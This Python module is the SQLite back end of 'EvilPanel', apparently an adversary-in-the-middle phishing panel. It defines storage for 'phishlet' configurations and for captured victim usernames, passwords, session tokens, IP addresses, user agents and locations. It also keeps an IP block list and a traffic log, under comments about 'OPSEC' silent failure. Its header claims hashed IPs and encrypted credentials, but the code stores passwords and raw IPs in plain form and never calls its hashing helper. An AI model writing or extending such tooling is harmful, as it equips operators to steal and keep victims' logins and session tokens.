"""
Database interface for EvilPanel
Source: plan-aligned-implementation-protocol.md Task 1.2
OPSEC: Silent failure, hashed IPs, encrypted credentials
"""

import sqlite3
import json
import hashlib
from pathlib import Path
from typing import Optional, List, Dict
from contextlib import contextmanager
from dataclasses import dataclass, asdict
from datetime import datetime, timedelta


@dataclass
class CapturedSession:
    """Captured session data structure"""
    id: str
    phishlet: str
    username: Optional[str]
    password: Optional[str]
    tokens: Dict[str, str]
    victim_ip: str
    user_agent: str
    timestamp: str
    location: Dict[str, str]
    
    def to_dict(self) -> dict:
        return asdict(self)
    
    def to_json(self) -> str:
        return json.dumps(self.to_dict())


class Database:
    """SQLite database interface with OPSEC compliance"""
    
    def __init__(self, db_path: str = 'data/evilpanel.db'):
        self.db_path = Path(db_path)
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self._init_schema()
    
    @contextmanager
    def get_connection(self):
        """Context manager for database connections"""
        conn = None
        try:
            conn = sqlite3.connect(str(self.db_path))
            conn.row_factory = sqlite3.Row
            yield conn
        finally:
            if conn:
                conn.close()
    
    def _init_schema(self) -> None:
        """Initialize database schema"""
        schema_path = Path(__file__).parent / 'schema.sql'
        
        try:
            with open(schema_path, 'r') as f:
                schema_sql = f.read()
            
            with self.get_connection() as conn:
                conn.executescript(schema_sql)
                conn.commit()
        except Exception:
            pass  # Silent failure - schema may already exist
    
    # Session Operations
    
    def save_session(self, session: CapturedSession) -> bool:
        """Save captured session to database"""
        try:
            with self.get_connection() as conn:
                conn.execute('''
                    INSERT OR REPLACE INTO sessions 
                    (id, phishlet, username, password, tokens_json, 
                     victim_ip, user_agent, captured_at, 
                     location_country, location_city, location_isp, is_processed)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    session.id,
                    session.phishlet,
                    session.username,
                    session.password,
                    json.dumps(session.tokens),
                    session.victim_ip,
                    session.user_agent,
                    session.timestamp,
                    session.location.get('country', ''),
                    session.location.get('city', ''),
                    session.location.get('isp', ''),
                    False
                ))
                conn.commit()
                return True
        except Exception:
            return False
    
    def get_session(self, session_id: str) -> Optional[CapturedSession]:
        """Get session by ID"""
        try:
            with self.get_connection() as conn:
                row = conn.execute(
                    'SELECT * FROM sessions WHERE id = ?',
                    (session_id,)
                ).fetchone()
                
                if not row:
                    return None
                
                return CapturedSession(
                    id=row['id'],
                    phishlet=row['phishlet'],
                    username=row['username'],
                    password=row['password'],
                    tokens=json.loads(row['tokens_json']),
                    victim_ip=row['victim_ip'],
                    user_agent=row['user_agent'],
                    timestamp=row['captured_at'],
                    location={
                        'country': row['location_country'],
                        'city': row['location_city'],
                        'isp': row['location_isp']
                    }
                )
        except Exception:
            return None
    
    def get_recent_sessions(self, limit: int = 50, offset: int = 0) -> List[CapturedSession]:
        """Get recent sessions ordered by capture time"""
        sessions = []
        try:
            with self.get_connection() as conn:
                rows = conn.execute('''
                    SELECT * FROM sessions 
                    ORDER BY captured_at DESC 
                    LIMIT ? OFFSET ?
                ''', (limit, offset)).fetchall()
                
                for row in rows:
                    sessions.append(CapturedSession(
                        id=row['id'],
                        phishlet=row['phishlet'],
                        username=row['username'],
                        password=row['password'],
                        tokens=json.loads(row['tokens_json']),
                        victim_ip=row['victim_ip'],
                        user_agent=row['user_agent'],
                        timestamp=row['captured_at'],
                        location={
                            'country': row['location_country'],
                            'city': row['location_city'],
                            'isp': row['location_isp']
                        }
                    ))
        except Exception:
            pass
        return sessions
    
    def get_sessions_by_phishlet(self, phishlet_name: str) -> List[CapturedSession]:
        """Get all sessions for a specific phishlet"""
        sessions = []
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    'SELECT * FROM sessions WHERE phishlet = ? ORDER BY captured_at DESC',
                    (phishlet_name,)
                ).fetchall()
                
                for row in rows:
                    sessions.append(CapturedSession(
                        id=row['id'],
                        phishlet=row['phishlet'],
                        username=row['username'],
                        password=row['password'],
                        tokens=json.loads(row['tokens_json']),
                        victim_ip=row['victim_ip'],
                        user_agent=row['user_agent'],
                        timestamp=row['captured_at'],
                        location={
                            'country': row['location_country'],
                            'city': row['location_city'],
                            'isp': row['location_isp']
                        }
                    ))
        except Exception:
            pass
        return sessions
    
    def mark_session_processed(self, session_id: str) -> bool:
        """Mark session as processed"""
        try:
            with self.get_connection() as conn:
                conn.execute(
                    'UPDATE sessions SET is_processed = TRUE WHERE id = ?',
                    (session_id,)
                )
                conn.commit()
                return True
        except Exception:
            return False
    
    def get_session_count(self) -> int:
        """Get total session count"""
        try:
            with self.get_connection() as conn:
                row = conn.execute('SELECT COUNT(*) FROM sessions').fetchone()
                return row[0] if row else 0
        except Exception:
            return 0
    
    # Phishlet Operations
    
    def save_phishlet(self, name: str, yaml_content: str) -> bool:
        """Save or update phishlet configuration"""
        try:
            with self.get_connection() as conn:
                conn.execute('''
                    INSERT OR REPLACE INTO phishlets 
                    (name, yaml_content, updated_at)
                    VALUES (?, ?, CURRENT_TIMESTAMP)
                ''', (name, yaml_content))
                conn.commit()
                return True
        except Exception:
            return False
    
    def get_phishlet(self, name: str) -> Optional[dict]:
        """Get phishlet by name"""
        try:
            with self.get_connection() as conn:
                row = conn.execute(
                    'SELECT * FROM phishlets WHERE name = ?',
                    (name,)
                ).fetchone()
                
                if not row:
                    return None
                
                return dict(row)
        except Exception:
            return None
    
    def set_phishlet_enabled(self, name: str, enabled: bool) -> bool:
        """Enable or disable phishlet"""
        try:
            with self.get_connection() as conn:
                conn.execute(
                    'UPDATE phishlets SET is_enabled = ?, updated_at = CURRENT_TIMESTAMP WHERE name = ?',
                    (enabled, name)
                )
                conn.commit()
                return True
        except Exception:
            return False
    
    def get_enabled_phishlets(self) -> List[dict]:
        """Get all enabled phishlets"""
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    'SELECT * FROM phishlets WHERE is_enabled = TRUE'
                ).fetchall()
                return [dict(row) for row in rows]
        except Exception:
            return []
    
    def get_all_phishlets(self) -> List[dict]:
        """Get all phishlets"""
        try:
            with self.get_connection() as conn:
                rows = conn.execute('SELECT * FROM phishlets').fetchall()
                return [dict(row) for row in rows]
        except Exception:
            return []
    
    # Blacklist Operations
    
    def add_blocked_ip(self, ip: str, reason: str = '', expires_hours: int = None) -> bool:
        """Add IP to blacklist"""
        try:
            with self.get_connection() as conn:
                expires_at = None
                if expires_hours:
                    expires_at = (datetime.utcnow() + timedelta(hours=expires_hours)).isoformat()
                
                conn.execute('''
                    INSERT OR REPLACE INTO blocked_ips 
                    (ip, reason, blocked_at, expires_at)
                    VALUES (?, ?, CURRENT_TIMESTAMP, ?)
                ''', (ip, reason, expires_at))
                conn.commit()
                return True
        except Exception:
            return False
    
    def is_ip_blocked(self, ip: str) -> bool:
        """Check if IP is blocked"""
        try:
            with self.get_connection() as conn:
                row = conn.execute('''
                    SELECT 1 FROM blocked_ips 
                    WHERE ip = ? 
                    AND (expires_at IS NULL OR expires_at > CURRENT_TIMESTAMP)
                ''', (ip,)).fetchone()
                return row is not None
        except Exception:
            return False
    
    def get_blocked_ips(self) -> List[dict]:
        """Get all blocked IPs (non-expired)"""
        try:
            with self.get_connection() as conn:
                rows = conn.execute('''
                    SELECT * FROM blocked_ips 
                    WHERE expires_at IS NULL OR expires_at > CURRENT_TIMESTAMP
                ''').fetchall()
                return [dict(row) for row in rows]
        except Exception:
            return []
    
    def remove_blocked_ip(self, ip: str) -> bool:
        """Remove IP from blacklist"""
        try:
            with self.get_connection() as conn:
                conn.execute('DELETE FROM blocked_ips WHERE ip = ?', (ip,))
                conn.commit()
                return True
        except Exception:
            return False
    
    # Traffic Logging
    
    def log_traffic(self, source_ip: str, destination: str, method: str, 
                    path: str, status_code: int, is_blocked: bool = False) -> bool:
        """Log traffic event"""
        try:
            with self.get_connection() as conn:
                conn.execute('''
                    INSERT INTO traffic_log 
                    (source_ip, destination, method, path, status_code, is_blocked)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (source_ip, destination, method, path, status_code, is_blocked))
                conn.commit()
                return True
        except Exception:
            return False
    
    def get_traffic_stats(self, hours: int = 24) -> dict:
        """Get traffic statistics for time period"""
        try:
            with self.get_connection() as conn:
                since = (datetime.utcnow() - timedelta(hours=hours)).isoformat()
                
                total = conn.execute('''
                    SELECT COUNT(*) FROM traffic_log WHERE timestamp > ?
                ''', (since,)).fetchone()[0]
                
                blocked = conn.execute('''
                    SELECT COUNT(*) FROM traffic_log 
                    WHERE timestamp > ? AND is_blocked = TRUE
                ''', (since,)).fetchone()[0]
                
                return {
                    'total_requests': total,
                    'blocked_requests': blocked,
                    'period_hours': hours
                }
        except Exception:
            return {'total_requests': 0, 'blocked_requests': 0}
    
    # Utility Methods
    
    @staticmethod
    def hash_ip(ip: str, salt: str = 'evilpanel_opsec') -> str:
        """Hash IP address for OPSEC compliance"""
        if not ip:
            return ''
        return hashlib.sha256(f"{salt}{ip}".encode()).hexdigest()[:16]

